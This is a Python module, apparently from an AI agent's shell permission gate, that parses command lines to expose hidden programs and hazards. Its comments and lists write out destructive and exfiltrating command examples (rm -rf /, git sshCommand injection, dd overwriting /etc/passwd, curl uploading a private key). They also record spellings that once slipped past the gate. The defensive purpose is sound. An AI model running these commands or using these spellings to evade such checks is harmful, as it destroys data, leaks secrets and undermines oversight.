"""Command analysis by parsing, not by pattern-matching the raw string.

``ronin.tools.shell`` guards its own narrow set of catastrophes with regexes over the
whole command. That is the right amount of paranoia for a tool that only wants to stop
the six shapes where an approval prompt arrives too late, and its docstring says so.
It is not enough for a permission gate, because a regex over the raw string cannot
answer the question the gate actually asks: *what are all the programs this string will
run?* The canonical failure is one line long::

    echo safe; rm -rf /

An allowlist that looks at the front of the string sees ``echo`` and says yes. This
module exists so that never happens: it splits the command into **segments**, resolves
each segment's real binary, and hands the caller every one of them — including the ones
hidden inside ``$(...)``, backticks, ``bash -c``, ``eval``, a heredoc fed to a shell,
and a ``python -c`` payload. The policy engine then evaluates *every* segment and takes
the most restrictive answer. Nothing here contradicts ``shell.py``: every shape that
module refuses is also refused here (see :mod:`ronin.safety.denylist`), this one just
refuses more, and for structural reasons rather than textual ones.

Three things about the parser are worth stating, because they are where the bypasses
live:

1. **Quoting is resolved before the binary is named.** ``r''m``, ``\\rm``, ``"rm"`` and
   ``/bin/rm`` all resolve to ``rm``. A tokenizer that kept the raw word would let any
   of them walk past a check on the literal text.
2. **Wrapper prefixes are stripped.** ``sudo``, ``env FOO=1``, ``nohup``, ``time``,
   ``command``, ``xargs``, ``timeout 5`` and a leading ``VAR=value`` are peeled off
   until a real program name is left, and the peeled prefixes are kept on the segment
   rather than discarded — the fact that ``sudo`` was there is itself a hazard. A
   wrapper flag whose value is *itself* a command line, ``env -S 'rm -rf /etc'``, is
   split back into words rather than skipped.
3. **Substitution is a segment, not a token.** ``echo `rm -rf /``` runs ``rm``. Inner
   commands are returned as their own segments carrying ``depth > 0`` and a ``parent``
   index, so a caller can both judge them and explain where they came from.

:func:`hazards` is deliberately separate from any notion of permission: it reports
*structural risk* (a pipe into an interpreter, an ``eval``, a recursive delete) and a
severity, and :mod:`ronin.safety.policy` is the only module that turns severity into a
decision. Analysis here, judgement there.

Known limits, stated rather than hidden: variables are not expanded (``$X`` stays
``$X``, except that ``$HOME``/``${HOME}`` are recognised as the home directory because
that one matters for the deny list), globs are not expanded against the filesystem, and
arithmetic/process substitution (``<(...)``) is treated as an opaque word rather than a
nested command.
"""

from __future__ import annotations

import re
import shlex
import string
from collections.abc import Callable, Iterator, Mapping, Sequence
from dataclasses import dataclass, field
from enum import StrEnum
from pathlib import PurePosixPath

# --------------------------------------------------------------------------- #
# Vocabulary
# --------------------------------------------------------------------------- #

#: Programs that take a command *string* and run it. Their payload is a nested
#: command, and a gate that does not look inside is a gate that ``bash -c`` defeats.
#:
#: ``su`` and ``script`` are here for the same reason the shells are, and it was
#: measured rather than assumed: piping a script into either one runs it, and both
#: take a ``-c`` line. Piping into ``runuser`` does *not* run it, so that one is a
#: wrapper instead.
SHELL_EXECUTORS: frozenset[str] = frozenset(
    {"sh", "bash", "zsh", "dash", "ksh", "ash", "fish", "csh", "tcsh", "su", "script"}
)

#: Interpreters whose ``-c``/``-e``/``-r`` argument is code that can shell out.
#: ``python -c "import os;os.system('rm -rf /')"`` is the shape this catches.
CODE_INTERPRETERS: Mapping[str, tuple[str, ...]] = {
    "python": ("-c",),
    "python3": ("-c",),
    "perl": ("-e", "-E"),
    "ruby": ("-e",),
    "node": ("-e", "--eval"),
    "php": ("-r",),
    # Documented gawk, not executed here -- this image ships mawk, which has no `-e`.
    # Left in rather than out: a spelling nobody checks is how the last four got in.
    "gawk": ("-e", "--source"),
}

#: Command-line flags for shell executors that spell ``-c`` some other way as well.
#: Only ``script`` does, of the ones here.
SHELL_COMMAND_FLAGS: Mapping[str, tuple[str, ...]] = {
    "script": ("-c", "--command"),
}

#: Programs that run the rest of the command line as another user.
#:
#: ``sudo`` and ``doas`` were here from the start. ``su -c 'rm -rf /'`` and
#: ``runuser -u root -- rm -rf /`` are the same escalation spelled differently, and
#: refusing one while allowing the others is not a posture, it is an oversight.
#: ``su`` is matched as the program and ``runuser`` as a peeled prefix, which is
#: simply where each of them ends up.
PRIVILEGE_ESCALATORS: frozenset[str] = frozenset({"sudo", "doas", "su", "runuser"})

#: Interpreters that take their program as an *operand* rather than behind a flag.
#:
#: ``awk 'BEGIN{system("rm -rf /etc")}'`` deletes the tree and was reported as ``awk``
#: and nothing else. ``perl -e`` and ``python -c`` were already read; awk was missed
#: because its program is not attached to a flag -- it is simply the first word that is
#: not an option.
#:
#: The value is the option flags that consume the *next* word, so the scan can tell an
#: option's value from the program.
PROGRAM_INTERPRETERS: Mapping[str, frozenset[str]] = {
    "awk": frozenset({"-F", "-v", "--field-separator", "--assign"}),
    "gawk": frozenset({"-F", "-v", "--field-separator", "--assign"}),
    "mawk": frozenset({"-F", "-v", "--field-separator", "--assign"}),
    "nawk": frozenset({"-F", "-v", "--field-separator", "--assign"}),
    "sed": frozenset({"-l", "--line-length"}),
}

#: Flags that mean the program came from somewhere other than the command line, so
#: there is no operand to read: ``-f`` names a file, and gawk's ``-e`` carries the
#: program itself and is handled as a code flag instead. With either present the first
#: plain word is *data*, and reading it as a program would report a phantom.
_PROGRAM_ELSEWHERE: tuple[str, ...] = ("-f", "--file", "-e", "--source")

#: ``sed``'s two ways to run a command, both GNU extensions and both measured against
#: GNU sed 4.9:
#:
#: * the ``e`` flag on a substitution -- ``sed 's/x/rm -rf \/etc/e'`` runs the
#:   replacement. In any flag order (``ge``, ``eg``) and with any delimiter.
#: * the ``e`` command -- ``sed 'e rm -rf /etc'``, with or without an address.
#:
#: Neither could be found by searching for an ``e``: ``sed 's/x/y/w notes-e.txt'`` has
#: one in a *filename*, ``sed '/error/d'`` in a regex, and ``sed ':e;n;be'`` in a label.
#: All three run nothing, so the script is walked rather than scanned.
#:
#: ``sed 'e'`` with no argument runs the *input line* -- whatever arrives on stdin
#: becomes the command. There is no text to report and saying so needs a hazard code
#: that does not exist yet, so it is left as a stated gap rather than a quiet one.
_SED_SCRIPT_FLAGS: tuple[str, ...] = ("-e", "--expression")

#: Substitution flags that are not ``e`` and do not end the flags.
_SED_SUBSTITUTION_FLAGS: str = "gpiImM0123456789"

#: sed commands taking no argument, and those taking the rest of the line (text for
#: ``a``/``i``/``c``, a filename for ``r``/``w``, a label for ``b``/``t``/``:``).
_SED_NO_ARGUMENT: str = "dDgGhHnNpPxzF=lL"
_SED_LINE_ARGUMENT: str = "aicrRwW:btT"

#: Programs that rewrite a file in place rather than printing to standard output.
#:
#: ``yq`` was missing, and ``yq`` is on the read-only allowlist -- so
#: ``yq -yi '.a=1' /etc/config.yml`` rewrote a file outside the workspace and was
#: *allowed*, while ``sed -i`` doing the same thing was refused. Measured against
#: yq 0.0.0 (the python one): ``-yi`` and ``--in-place --yaml-output`` both change the
#: file on disk.
#:
#: ``--inplace`` without the hyphen is the Go yq's spelling of the same flag; both are
#: listed because which one is installed is not something the parser can know.
IN_PLACE_EDITORS: frozenset[str] = frozenset({"sed", "perl", "ruby", "yq"})
IN_PLACE_FLAGS: tuple[str, ...] = ("-i", "--in-place", "--inplace")

#: Builtins that run their argument as a command.
EVAL_BINARIES: frozenset[str] = frozenset({"eval", "source", "."})

#: Anything that fetches from the network. A fetch piped to a shell is the single
#: most common real-world remote-execution shape.
FETCH_BINARIES: frozenset[str] = frozenset(
    {"curl", "wget", "fetch", "http", "https", "httpie", "aria2c", "scp", "ftp", "nc"}
)

#: Decoders whose output is only ever meant to be run when someone is hiding it.
DECODER_BINARIES: frozenset[str] = frozenset(
    {"base64", "base32", "uudecode", "xxd", "openssl", "gunzip", "zcat", "gzip", "atob"}
)

#: Words peeled off the front of a segment while looking for the real program.
#: ``xargs`` is here on purpose: ``echo / | xargs rm -rf`` runs ``rm``, and a resolver
#: that stopped at ``xargs`` would report a harmless-looking binary.
#: Shell reserved words that *introduce* a command rather than being one.
#:
#: Without these, ``{ rm -rf /; }`` resolved to a program called ``{`` and the ``rm``
#: after it was read as its argument — so every rule that keys on the binary had
#: nothing to match, and a recursive delete of ``/`` produced no hazard at all. The
#: same held for ``then``, ``do`` and ``else``, which is to say for the body of every
#: ``if``, ``for`` and ``while`` ever written. ``( … )`` was already fine because
#: parentheses are operator tokens; this closes the asymmetry.
#:
#: Peeled through the same path as :data:`WRAPPERS` because the shape is identical —
#: a word that precedes the real program — but kept as its own set: these are grammar,
#: not programs, and a reader should not have to wonder which ``time`` is meant.
SHELL_KEYWORDS: frozenset[str] = frozenset(
    {
        "{",
        "}",
        "!",
        "if",
        "then",
        "elif",
        "else",
        "fi",
        "while",
        "until",
        "for",
        "select",
        "do",
        "done",
        "case",
        "esac",
        "in",
    }
)

WRAPPERS: frozenset[str] = frozenset(
    {
        "sudo",
        "doas",
        "env",
        "nohup",
        "time",
        "command",
        "builtin",
        "exec",
        "nice",
        "ionice",
        "stdbuf",
        "setsid",
        "timeout",
        "xargs",
        "busybox",
        "watch",
        "flock",
        "chroot",
        "unshare",
        "setarch",
        "runuser",
    }
)

#: Wrapper flags that consume the following word, so the resolver does not mistake a
#: flag's *value* for the program name (``sudo -u root rm`` must resolve to ``rm``).
_WRAPPER_VALUE_FLAGS: Mapping[str, frozenset[str]] = {
    "sudo": frozenset({"-u", "-g", "-p", "-C", "-h", "-U", "-r", "-t"}),
    "doas": frozenset({"-u", "-C"}),
    "env": frozenset({"-u", "-C", "--unset", "--chdir"}),
    "nice": frozenset({"-n", "--adjustment"}),
    "ionice": frozenset({"-c", "-n", "-p"}),
    "timeout": frozenset({"-s", "-k", "--signal", "--kill-after"}),
    "xargs": frozenset({"-n", "-I", "-P", "-d", "-a", "-E", "-L", "-s", "--replace"}),
    "stdbuf": frozenset({"-i", "-o", "-e"}),
    "watch": frozenset({"-n", "--interval"}),
    "flock": frozenset(
        {"-w", "--wait", "--timeout", "-E", "--conflict-exit-code", "-c", "--command"}
    ),
    "chroot": frozenset({"--userspec", "--groups"}),
    "runuser": frozenset(
        {"-u", "--user", "-g", "--group", "-G", "--supp-group", "-s", "--shell", "-c", "--command"}
    ),
    "unshare": frozenset(
        {
            "-S",
            "-G",
            "-R",
            "-w",
            "--setuid",
            "--setgid",
            "--root",
            "--wd",
            "--map-user",
            "--map-group",
            "--map-users",
            "--map-groups",
            "--propagation",
        }
    ),
}

#: Wrapper flags whose value is a whole shell command line.
#:
#: ``flock /tmp/lock -c 'rm -rf /etc'`` runs the line through a shell -- measured:
#: ``flock /tmp/lock -c 'echo a | wc -l'`` prints ``1``, so the pipe is real. The flag
#: is keyed on the *prefix* rather than the binary because peeling the wrapper is
#: exactly what hides the line: with ``flock`` gone and its lock file taken as the
#: operand, the quoted line is simply the next word, and the segment came back naming
#: a program called ``rm -rf /etc``.
#:
#: ``-c`` has to follow the lock file. Measured: ``flock -c LINE FILE`` runs nothing,
#: ``flock FILE -c LINE`` runs the line. Nothing here depends on the order, so an
#: invalid spelling is read anyway rather than being quietly dropped.
WRAPPER_COMMAND_FLAGS: Mapping[str, frozenset[str]] = {
    "flock": frozenset({"-c", "--command"}),
    "runuser": frozenset({"-c", "--command"}),
}

#: Wrappers whose first non-flag word is an operand rather than the program.
#:
#: ``timeout 5 rm -rf /`` was already handled by hand; the rest arrived with the same
#: shape. ``flock`` locks a file and ``chroot`` enters a directory before running what
#: follows, and ``setarch`` may be given a personality to run under. Reading the
#: operand as the program is how ``flock /tmp/lock rm -rf /etc`` came back as ``flock``
#: with nothing else to say.
#:
#: At most one is consumed. ``timeout`` used to swallow every duration-shaped word in
#: a row, which was harmless only because a second one never occurs.
_WRAPPER_OPERAND: Mapping[str, Callable[[str], bool]] = {
    "timeout": lambda word: _is_duration(word),
    "setarch": lambda word: word in _SETARCH_PERSONALITIES,
    "flock": lambda _word: True,
    "chroot": lambda _word: True,
    # `runuser root` becomes root: the first plain word is the user, never the program.
    # The program comes after `--`, and `--` ends the scan before the operand rule runs.
    "runuser": lambda _word: True,
}

#: Everything ``setarch --list`` prints. Unlike ``flock``'s lock file the personality
#: is optional, so it can only be recognised by name -- and guessing wrong would read
#: the program as a personality and drop it.
_SETARCH_PERSONALITIES: frozenset[str] = frozenset(
    {
        "uname26",
        "linux32",
        "linux64",
        "i386",
        "i486",
        "i586",
        "i686",
        "athlon",
        "x86_64",
        "ppc",
        "ppc64",
        "ppc32",
        "ppc64le",
        "s390",
        "s390x",
        "sparc",
        "sparc32",
        "sparc32bash",
        "sparc64",
        "mips",
        "mips64",
        "mips32",
        "ia64",
        "arm",
        "armv7l",
        "armv8l",
        "aarch64",
        "parisc",
        "parisc32",
        "parisc64",
    }
)

#: Flags whose *following words* are a command, up to a ``;`` or ``+`` terminator.
#:
#: Unlike :data:`WRAPPERS`, the binary here is a real program doing real work --
#: ``find`` is not a prefix to peel off. The command it runs sits in the middle of its
#: argv, so a resolver that reads only the first word reports ``find`` and stops.
#: ``find . -exec rm -rf {} \;`` deletes the tree and used to raise no hazard at all.
#:
#: ``-ok`` and ``-okdir`` prompt the user per file before running. They are listed
#: anyway: the prompt is ``find``'s, shown after Ronin has already decided, and a
#: human who has been told nothing is about to run is being asked the wrong question.
EXEC_ARGUMENT_FLAGS: Mapping[str, frozenset[str]] = {
    "find": frozenset({"-exec", "-execdir", "-ok", "-okdir"}),
}

#: Flags whose *next word* is a whole command, quoted as one argument.
#:
#: Unlike :data:`EXEC_ARGUMENT_FLAGS` there is no terminator to find: the command is a
#: single argv word because the shell already collapsed the quotes around it. That is
#: the same shape as ``bash -c`` and it is read the same way.
#:
#: Every entry was checked by running it in a throwaway repository and seeing whether a
#: marker file appeared, because ``git``'s own documentation is not consistent about
#: which of these go through a shell.
COMMAND_ARGUMENT_FLAGS: Mapping[str, frozenset[str]] = {
    "git": frozenset(
        {
            "-x",
            "--exec",
            "--tree-filter",
            "--index-filter",
            "--commit-filter",
            "--env-filter",
            "--msg-filter",
            "--parent-filter",
        }
    ),
}

#: Config keys whose *value* is a command line git will execute.
#:
#: `git -c core.sshCommand='rm -rf /etc' fetch` runs the delete. The command is not an
#: argument here -- it is a configuration value, which is why the flag tables above
#: cannot see it.
#:
#: Split by shape because git's key grammar is not flat: some are exact, some carry a
#: user-chosen name in the middle (`filter.<whatever>.clean`), and some are a whole
#: section (`pager.<subcommand>`).
_CONFIG_COMMAND_KEYS: frozenset[str] = frozenset(
    {
        "core.pager",
        "core.editor",
        "core.sshcommand",
        "sequence.editor",
        "diff.external",
        "gpg.program",
        "uploadpack.packobjectshook",
    }
)

#: `(prefix, suffix)` pairs, with a name of git's user's choosing in between.
_CONFIG_COMMAND_PATTERNS: tuple[tuple[str, str], ...] = (
    ("filter.", ".clean"),
    ("filter.", ".smudge"),
    ("filter.", ".process"),
    ("diff.", ".textconv"),
    ("diff.", ".command"),
    ("merge.", ".driver"),
    ("gpg.", ".program"),
)

#: Whole sections where every key's value is a command.
_CONFIG_COMMAND_SECTIONS: tuple[str, ...] = ("pager.",)

#: Keys where a leading `!` is what makes the value a shell line rather than a name.
#: `alias.co=checkout` is a git subcommand; `alias.co=!rm -rf /` is a delete.
#: `credential.helper=foo` names the program `git-credential-foo`, which is not a shell
#: line and not this parser's business.
_CONFIG_BANG_KEYS: tuple[str, ...] = ("alias.", "credential.helper")

#: Environment variables that are the same setting through a different door.
#: `GIT_SSH_COMMAND='rm -rf /etc' git fetch` needs no `-c` at all.
_GIT_COMMAND_ENV: frozenset[str] = frozenset(
    {
        "GIT_PAGER",
        "GIT_EDITOR",
        "GIT_SEQUENCE_EDITOR",
        "GIT_SSH_COMMAND",
        "GIT_EXTERNAL_DIFF",
        "GIT_ASKPASS",
        "SSH_ASKPASS",
    }
)


def _config_command(key: str, value: str) -> str | None:
    """The command in a git config value, or ``None`` when the value is not one."""
    name = key.strip().lower()
    for bang in _CONFIG_BANG_KEYS:
        if name.startswith(bang) and value.startswith("!"):
            return value[1:] or None
    if name in _CONFIG_COMMAND_KEYS:
        return value or None
    if any(name.startswith(section) for section in _CONFIG_COMMAND_SECTIONS):
        return value or None
    for prefix, suffix in _CONFIG_COMMAND_PATTERNS:
        if name.startswith(prefix) and name.endswith(suffix) and len(name) > len(prefix + suffix):
            return value or None
    return None


def _config_commands(
    argv: Sequence[str], assignments: Sequence[tuple[str, str]]
) -> tuple[str, ...]:
    """Every command git would run because of a ``-c`` setting or an environment name.

    ``--config-env`` is resolved against ``assignments`` because that is where the value
    lives when it was written on the same line. A variable inherited from the ambient
    environment is not here to be read, and is not guessed at.
    """
    found: list[str] = []
    index = 1
    while index < len(argv):
        word = argv[index]
        setting = ""
        if word == "-c" and index + 1 < len(argv):
            index += 1
            setting = argv[index]
        elif word.startswith("-c") and len(word) > 2:
            setting = word[2:]  # `-ccore.pager=…`, which git also accepts
        elif word.startswith("--config="):
            setting = word[len("--config=") :]
        elif word.startswith("--config-env="):
            # `--config-env=key=VAR` takes the value from the environment rather than
            # from the word, so the command is only here when the variable is set on
            # this same line. `V='rm -rf /etc' git --config-env=core.sshCommand=V …`
            # is the whole attack in one command, and that is the shape a model emits.
            key, _, name = word[len("--config-env=") :].partition("=")
            setting = f"{key}={dict(assignments).get(name, '')}" if name else ""
        if setting and "=" in setting:
            key, value = setting.split("=", 1)
            command = _config_command(key, value)
            if command:
                found.append(command)
        index += 1
    for name, value in assignments:
        if name in _GIT_COMMAND_ENV and value:
            found.append(value)
    return tuple(found)


#: Subcommand phrases after which *everything else* is a command to run.
#:
#: ``git submodule foreach 'rm -rf /etc'`` deletes the directory once per submodule and
#: reported binary ``git``, no hazards. ``git bisect run`` is the same idea with the
#: command spelled as plain argv rather than one quoted word; joining the remainder
#: reads both, since a quoted word rejoins to exactly what was written.
#:
#: Options belonging to the phrase itself -- ``--recursive``, ``-q`` -- are skipped, so
#: the command is found rather than mistaken for one of them.
COMMAND_SUBCOMMANDS: tuple[tuple[str, tuple[str, ...]], ...] = (
    ("git", ("submodule", "foreach")),
    ("git", ("bisect", "run")),
)


#: What ends an ``-exec`` clause. ``\;`` runs the command once per match and ``+``
#: batches the matches into one run; the difference is how often, not what.
_EXEC_TERMINATORS: frozenset[str] = frozenset({";", "+"})


#: ``VAR=value`` at the head of a segment is an environment assignment, not a program.
_ASSIGNMENT = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")

#: Redirect targets that are never a real file and must not be treated as one.
HARMLESS_DEVICES: frozenset[str] = frozenset(
    {"/dev/null", "/dev/stdout", "/dev/stderr", "/dev/stdin", "/dev/tty", "/dev/zero"}
)

_OPERATOR_TOKENS: tuple[str, ...] = ("&&", "||", ";;", ";", "|&", "|", "&", "(", ")")

#: How a raw operator is reported as a segment connector. ``(``/``)`` collapse to ``;``
#: because subshell grouping changes scope, not which programs run, and this module
#: only answers the second question.
_CONNECTOR: Mapping[str, str] = {";;": ";", "|&": "|", "(": ";", ")": ";", "": ""}


class Origin(StrEnum):
    """Where a segment came from. Explains a nested segment to a human."""

    TOP = "top"
    SUBSTITUTION = "substitution"
    SHELL_C = "shell-c"
    EVAL = "eval"
    INTERPRETER = "interpreter"
    HEREDOC = "heredoc"
    EXEC_ARGUMENT = "exec-argument"


# --------------------------------------------------------------------------- #
# The public value
# --------------------------------------------------------------------------- #


@dataclass(frozen=True, slots=True)
class Redirect:
    """One redirection. ``target`` is the unquoted word, ``""`` if there was none."""

    operator: str
    target: str

    @property
    def writes(self) -> bool:
        """Whether this redirect can create or truncate ``target``."""
        return self.operator.startswith((">", "&>", "1>", "2>")) and bool(self.target)

    @property
    def names_a_file(self) -> bool:
        """Whether ``target`` is a filename rather than a file descriptor.

        ``2>&1`` writes to fd 1, not to a file called ``1``; treating it as a path is
        how a redirect check ends up denying ``npm test 2>&1``.
        """
        return self.writes and not self.operator.endswith("&") and not self.target.isdigit()


@dataclass(frozen=True, slots=True)
class Segment:
    """One command out of a compound command line.

    ``raw`` is the exact slice of the original string (so an approval prompt can show
    what a human is deciding on), ``binary`` is the resolved program basename, and
    ``argv`` is the program plus its arguments with wrapper prefixes and environment
    assignments removed. Nothing is thrown away: ``prefixes`` and ``assignments`` keep
    what was peeled, because ``sudo`` having been present is a fact the gate needs.
    """

    raw: str
    binary: str
    argv: tuple[str, ...]
    depth: int = 0
    connector: str = ""
    terminator: str = ""
    origin: Origin = Origin.TOP
    parent: int | None = None
    binary_raw: str = ""
    prefixes: tuple[str, ...] = ()
    assignments: tuple[tuple[str, str], ...] = ()
    redirects: tuple[Redirect, ...] = ()
    heredocs: tuple[str, ...] = ()

    def __post_init__(self) -> None:
        if self.depth < 0:
            raise ValueError("Segment.depth must be >= 0")
        if self.depth == 0 and self.origin is not Origin.TOP:
            raise ValueError("a depth-0 segment must have origin TOP")
        if self.depth > 0 and self.origin is Origin.TOP:
            raise ValueError("a nested segment must say where it came from")

    @property
    def line(self) -> str:
        """The resolved command as a single line: what rules are matched against.

        Matching the *resolved* argv rather than ``raw`` is what makes a rule like
        ``^git status`` survive ``env GIT_PAGER=cat /usr/bin/git status`` — and what
        stops ``r''m -rf /`` from dodging a rule written against ``rm``.
        """
        if not self.argv:
            return ""
        return " ".join((self.binary, *self.argv[1:]))

    @property
    def flags(self) -> tuple[str, ...]:
        """Argument words that look like options, up to a ``--`` terminator."""
        out: list[str] = []
        for word in self.argv[1:]:
            if word == "--":
                break
            if word.startswith("-") and word != "-":
                out.append(word)
        return tuple(out)

    @property
    def operands(self) -> tuple[str, ...]:
        """Argument words that are not options. Everything after ``--`` counts."""
        out: list[str] = []
        seen_terminator = False
        for word in self.argv[1:]:
            if not seen_terminator and word == "--":
                seen_terminator = True
                continue
            if not seen_terminator and word.startswith("-") and word != "-":
                continue
            out.append(word)
        return tuple(out)

    def has_flag(self, *names: str) -> bool:
        """Whether any of ``names`` appears, including inside a short cluster.

        ``-rf``, ``-fr`` and ``-r -f`` are the same command; a check that only
        compared whole words would miss two of the three.
        """
        for flag in self.flags:
            if flag in names:
                return True
            if flag.startswith("--"):
                if flag.split("=", 1)[0] in names:
                    return True
                continue
            cluster = flag[1:]
            for name in names:
                if len(name) == 2 and name.startswith("-") and name[1] in cluster:
                    return True
        return False

    @property
    def path_words(self) -> tuple[str, ...]:
        """Every word that could name a file, plus every write redirect target.

        Deliberately generous on operands — a path check that misses an argument is a
        check that misses the one command that mattered, and an extra candidate costs a
        string comparison. Redirect targets skip the heuristic entirely: ``> notes.txt``
        names a file even though the word has no ``/`` in it, and that is exactly the
        case a "looks like a path" test gets wrong.
        """
        words: list[str] = []
        for word in self.operands:
            # `dd of=/etc/passwd` names a path the way no other program does, and the
            # `key=` in front of it is what hid the path from every check that resolves
            # one. Unwrapped here so every caller sees the target, not the operand.
            candidate = _dd_path(self.binary, word) or word
            if _looks_like_path(candidate):
                words.append(candidate)
        # An output flag's value is a path whether or not it looks like one, and the
        # welded spellings never reach `operands` at all -- same reason a redirect
        # target skips the heuristic below.
        for target in (*self.output_targets, *self.payload_targets):
            if target not in words:
                words.append(target)
        words.extend(r.target for r in self.redirects if r.names_a_file)
        return tuple(words)

    @property
    def payload_targets(self) -> tuple[str, ...]:
        """Files this segment sends somewhere because a flag named them."""
        return _payload_targets(self.binary, self.argv)

    @property
    def output_targets(self) -> tuple[str, ...]:
        """Files and directories this segment writes because a flag named them."""
        return _output_targets(self.binary, self.argv)


#: Flags whose value is a file or directory the program *writes*, on programs that
#: otherwise only read -- so the write had nothing looking at it.
#:
#: ``curl -o /etc/passwd URL`` and ``sort -o /etc/passwd f`` both overwrite the file,
#: and ``curl``, ``wget`` and ``sort`` are all on the read-only allowlist, whose comment
#: says none of its entries can change a byte. So these were *allowed*, not asked
#: about, while the same write spelled as ``> /etc/passwd`` was refused.
#:
#: Two things were wrong, and the second is worse. Written apart, the path did reach
#: :attr:`Segment.path_words` but was read as a *read*, because the segment's program is
#: not a write binary. Written welded to the flag -- ``-o/etc/passwd``,
#: ``--output=/etc/passwd`` -- it produced no path word at all: :attr:`Segment.operands`
#: drops every word starting with ``-``, so there was not even a read to check.
#:
#: Per-binary because the same letter means different things. ``curl -O`` takes no value
#: at all (it names the file after the URL -- measured: ``curl -sO
#: file:///etc/hostname`` writes ``hostname``), so listing it under ``curl`` would eat
#: the URL as a write target. Under ``wget`` the same letter *is* the output file.
OUTPUT_FLAGS: Mapping[str, tuple[str, ...]] = {
    "curl": ("-o", "--output", "--output-dir"),
    "wget": ("-O", "--output-document", "-P", "--directory-prefix"),
    "sort": ("-o", "--output"),
}


#: Flags whose value is a file the program *sends*. The mirror of :data:`OUTPUT_FLAGS`.
#:
#: ``curl -T tls.key http://host/`` uploads a private key and nothing looked at it: a
#: file named behind a flag is not an operand, and a bare filename is not a path, so the
#: word never reached a check at all. Written ``./tls.key`` the same command is refused,
#: which is a difference of one character.
#:
#: Left out on purpose, because they name a credential used for the TLS *handshake*
#: rather than a file being sent: ``--key``, ``--cert``, ``--cacert``,
#: ``--private-key``, ``--certificate``. ``curl --cert client.crt --key client.key
#: https://api/`` is ordinary mutual-TLS work and refusing it would be the kind of noise
#: that gets a check switched off.
#:
#: Also left out: ``--data-raw``, whose whole point is that ``@`` is literal there
#: (curl's own help says so); ``--form-string``, whose value is a string by definition;
#: ``-K``/``--config`` and ``-b``/``--cookie``, which read a file *into* curl rather than
#: sending it; and wget's ``-i``, which reads a list of URLs.
PAYLOAD_FLAGS: Mapping[str, tuple[str, ...]] = {
    "curl": (
        "-T",
        "--upload-file",
        "-d",
        "--data",
        "--data-binary",
        "--data-urlencode",
        "-F",
        "--form",
    ),
    "wget": ("--post-file", "--body-file"),
}

#: Payload flags whose value is literal data unless it starts with ``@``. ``-T`` names a
#: file outright; ``-d hello`` posts the word ``hello``.
_AT_MARKED_PAYLOAD_FLAGS: frozenset[str] = frozenset(
    {"-d", "--data", "--data-binary", "--data-urlencode", "-F", "--form"}
)


#: ``dd``'s operands are ``key=value``, and two of those values are paths.
#:
#: `dd if=/dev/zero of=/etc/passwd` zeroes the file. The word in the argv is
#: `of=/etc/passwd`, so a path check reads the whole thing as one odd relative name and
#: finds nothing outside the workspace -- while `truncate -s0 /etc/passwd`, the same
#: destruction spelled normally, was refused. `bs=`, `count=`, `seek=` and the rest are
#: numbers and are left alone.
_DD_PATH_OPERANDS: tuple[str, ...] = ("of=", "if=")


def _output_targets(binary: str, argv: Sequence[str]) -> tuple[str, ...]:
    """Files and directories named by an output flag, however the flag is written.

    All four spellings, since a check that reads three of them is a check with a fourth
    way past it: ``-o FILE``, ``-oFILE``, ``--output FILE``, ``--output=FILE``.

    A value of ``-`` is standard output rather than a file called ``-`` -- measured for
    both, ``curl -o -`` and ``wget -O-`` leave a file of that name alone -- so it is not
    a write target.
    """
    flags = OUTPUT_FLAGS.get(binary)
    if flags is None:
        return ()
    return tuple(value for _flag, value in _flag_values(argv, flags) if value and value != "-")


def _flag_values(argv: Sequence[str], flags: Sequence[str]) -> tuple[tuple[str, str], ...]:
    """Every ``(flag, value)`` pair in ``argv``, in all four spellings.

    ``-o FILE``, ``-oFILE``, ``--output FILE``, ``--output=FILE`` -- a check that reads
    three of them is a check with a fourth way past it. The flag comes back with the
    value because what the value *means* depends on it: ``-T`` names a file outright,
    ``-d`` only names one after an ``@``.
    """
    found: list[tuple[str, str]] = []
    index = 1
    while index < len(argv):
        word = argv[index]
        for flag in flags:
            if word == flag:
                if index + 1 < len(argv):
                    found.append((flag, argv[index + 1]))
                    index += 1
                break
            if word.startswith(f"{flag}="):
                found.append((flag, word[len(flag) + 1 :]))
                break
            # Only a short flag can carry its value welded on with nothing between.
            if len(flag) == 2 and not flag.startswith("--") and word.startswith(flag):
                found.append((flag, word[len(flag) :]))
                break
        index += 1
    return tuple(found)


def _payload_targets(binary: str, argv: Sequence[str]) -> tuple[str, ...]:
    """Files this segment sends somewhere, named by a payload flag.

    The mirror of :func:`_output_targets`: that one covers what a command *writes*, this
    one what it *sends*. Both exist because a file named behind a flag is not an operand
    and a bare filename is not a path -- so ``curl -T tls.key http://host/`` handed a
    private key over with nothing having looked at it, while the same key one character
    differently written, ``./tls.key``, was refused.

    ``-d`` and its relatives take literal data unless it starts with ``@``; ``-F`` takes
    ``name=@file``. ``-T`` and ``--post-file`` name a file outright. A value of ``-`` is
    standard input rather than a file called ``-``.
    """
    flags = PAYLOAD_FLAGS.get(binary)
    if flags is None:
        return ()
    found: list[str] = []
    for flag, value in _flag_values(argv, flags):
        name = value
        if flag in _AT_MARKED_PAYLOAD_FLAGS:
            _, marker, after = value.partition("@")
            if not marker:
                # Literal data, not a file. `-d hello` posts the word `hello`.
                continue
            name = after
        if name and name != "-":
            found.append(name)
    return tuple(found)


def _dd_path(binary: str, word: str) -> str | None:
    """The path inside a ``dd`` operand, or ``None`` when the word is not one."""
    if binary != "dd":
        return None
    for prefix in _DD_PATH_OPERANDS:
        if word.startswith(prefix):
            return word[len(prefix) :] or None
    return None


#: Filename suffixes that mean "this is a private key".
#:
#: ``.key`` and ``_key`` were the two commonest names and both were absent. ``.key`` is
#: the standard TLS private-key extension, and ``_key`` is how OpenSSH names host keys:
#: ``ssh_host_rsa_key`` ends ``_key``, *not* ``_rsa``, so the entry above walked right
#: past it.
#:
#: The worst case was inside the project. ``tls.key`` in the workspace was allowed for
#: both read and write -- the workspace boundary cannot help with a file that is already
#: inside it -- so ``curl -T tls.key http://host/`` sent a private key off the machine
#: with nothing objecting, while the same key material at ``~/.ssh/id_rsa`` was refused
#: both ways.
#:
#: ``.pem`` is deliberately absent. It is the certificate extension as often as the key
#: one -- ``cert.pem``, ``chain.pem`` and ``fullchain.pem`` are all public and sit next
#: to ``privkey.pem`` -- so matching it would refuse ordinary certificate work, which is
#: the kind of noise that gets a check switched off. ``privkey.pem`` stays uncovered,
#: which is a stated gap rather than a hidden one.
#:
#: ``.key`` is also Apple Keynote's extension, so a file named ``deck.key`` is refused.
#: In a coding workspace a TLS private key is the likelier meaning, and that trade is
#: better named than hidden.
KEY_SUFFIXES: tuple[str, ...] = (
    "_rsa",
    "_dsa",
